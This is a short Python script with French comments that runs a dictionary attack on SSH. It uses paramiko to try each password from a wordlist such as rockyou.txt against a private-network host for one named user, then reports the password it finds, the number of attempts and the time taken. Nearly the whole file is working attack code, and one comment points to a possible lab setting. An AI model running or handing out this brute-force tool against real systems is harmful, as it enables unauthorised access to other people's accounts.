import paramiko
import time

def ssh_dict_attack(target_ip, username, wordlist_path):
    print(f"[*] Démarrage de l'attaque sur {target_ip} pour l'utilisateur '{username}'...")
    
    # Initialisation du client SSH
    client = paramiko.SSHClient()
    # Accepter automatiquement la clé de l'hôte (nécessaire pour un script automatisé)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    attempts = 0
    start_time = time.time()
    
    try:
        # Ouverture de la wordlist (ex: rockyou.txt)
        with open(wordlist_path, 'r', encoding='utf-8') as file:
            for line in file:
                attempts += 1
                password = line.strip()
                
                try:
                    # Tentative de connexion réseau au service SSH (port 22 par défaut)
                    print(f"[*] Tentative {attempts} : {password}")

                    client.connect(target_ip, username=username, password=password, timeout=3, look_for_keys=False, allow_agent=False)
                    elapsed_time = time.time() - start_time
                    print(f"[+] Succès ! Mot de passe trouvé : '{password}'")
                    print(f"[+] Tentatives : {attempts}")
                    print(f"[+] Temps écoulé : {elapsed_time:.2f} secondes")
                    
                    client.close()
                    return True
                    
                except paramiko.AuthenticationException:
                    # Échec de l'authentification (C'est ce qui génère le log sur la cible)
                    pass
                except Exception as e:
                    print(f"[-] Erreur réseau avec {target_ip} : {e}")
                    break
                    
    except FileNotFoundError:
        print(f"[-] Erreur : Le fichier dictionnaire '{wordlist_path}' est introuvable.")
        return False
        
    print("[-] Attaque terminée. Mot de passe introuvable dans la wordlist.")
    return False

if __name__ == "__main__":
    # Paramètres de l'attaque réseau
    CIBLE_IP = "192.168.122.72"
    UTILISATEUR = "yassine"
    DICTIONNAIRE = "/usr/share/wordlists/rockyou.txt"
    
    ssh_dict_attack(CIBLE_IP, UTILISATEUR, DICTIONNAIRE)
